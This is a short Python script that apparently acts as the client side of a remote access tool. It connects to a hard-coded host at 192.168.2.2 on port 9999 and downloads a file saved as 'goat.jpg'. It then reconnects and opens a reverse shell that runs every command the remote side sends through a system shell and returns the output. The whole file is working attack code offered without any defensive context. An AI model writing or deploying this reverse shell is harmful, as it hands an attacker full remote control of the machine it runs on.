import socket
import os
import sys
import subprocess

def start_receiver(restart):
        try:
                global host
                global sock
                global port
                sock = socket.socket()
                host = '192.168.2.2'
                port = 9999

                sock.connect((host,port))
                if not restart:
                        receive_file()
                else:
                        reverse_shell()
        except socket.error as msg:
                print("Socket creation error: " + str(msg))

def receive_file():
        sock.send(b"Hello from client!")
        with open("goat.jpg","wb") as file:
                while True:
                        data = sock.recv(1024)
                        if not data:
                                break
                        file.write(data)
        sock.close()
        restart_socket()

def restart_socket():
        restart = 1
        start_receiver(restart)

def reverse_shell():
        while True:
                data = sock.recv(1024)
                if not data:
                        break
                if data[:2].decode("utf-8") == 'cd':
                        os.chdir(data[3:].decode("utf-8"))
                if len(data) > 0 and not data.decode("utf-8") == 'quit':
                        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) 
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        output_string = str(output_byte,"utf-8")
                        cwd = os.getcwd() + "> "
                        sock.send(str.encode(output_string + cwd))

def main():
        restart = 0
        start_receiver(restart)

main()
